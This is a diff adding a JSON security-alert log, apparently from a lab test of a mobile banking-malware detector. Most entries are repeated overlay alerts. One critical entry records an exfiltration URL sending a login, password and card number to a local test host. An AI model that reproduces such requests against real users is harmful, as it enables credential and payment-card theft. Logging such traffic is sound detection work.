+      "timestamp": "2026-06-11T22:01:44.759039",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.762383",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.766206",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.778592",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.782464",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.788849",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.796836",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.800480",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.806742",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.811202",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.815435",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.819731",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.824595",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.828490",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.832334",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.835553",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.841393",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.844887",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.848462",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.852301",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.856690",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.861219",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.864743",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.870657",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.876510",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.879810",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.883268",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.888793",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.893380",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.897192",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.900784",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.906361",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.910712",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.914418",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.917227",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.922980",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.926437",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.929954",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.933101",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.938605",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.942757",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.947278",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.950747",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.956023",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.959618",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.963860",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.966840",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.973665",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.977470",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.980742",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.986296",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.991518",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.004848",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.012587",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.012864",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.025309",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.025684",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.029829",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.036285",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.041372",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.046929",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.056683",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.062370",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.067696",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.075398",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.083845",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.090528",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.098625",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.109175",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.120263",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.152513",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.152971",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.167504",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.167997",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.171100",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.175377",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.187879",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.196572",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.208743",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.218754",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.219158",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.227066",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.244286",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.246816",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.252611",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.263800",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.276433",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.283582",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.294152",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.302554",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.316131",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.328981",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.337044",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.346189",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.371122",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.371452",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.371715",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.377097",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.388521",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.397279",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.406631",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.409466",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.418378",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.432634",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.441619",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.449289",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.457306",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.465709",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.474283",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.485789",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.491722",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.502077",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.522386",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.531460",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.546046",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.554866",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.564101",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.576112",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.576326",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.585809",
+      "level": "critical",
+      "threat": "C2 Exfiltration",
+      "details": "SUSPICIOUS URL inside process: http://10.0.2.2:9999/exfiltrate?login=jack&pass=Jack%40123&card=4111111111111111 [NOT a bank server!]"
+    },
+    {
+      "timestamp": "2026-06-11T22:01:45.587833",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    }
+  ]
+}
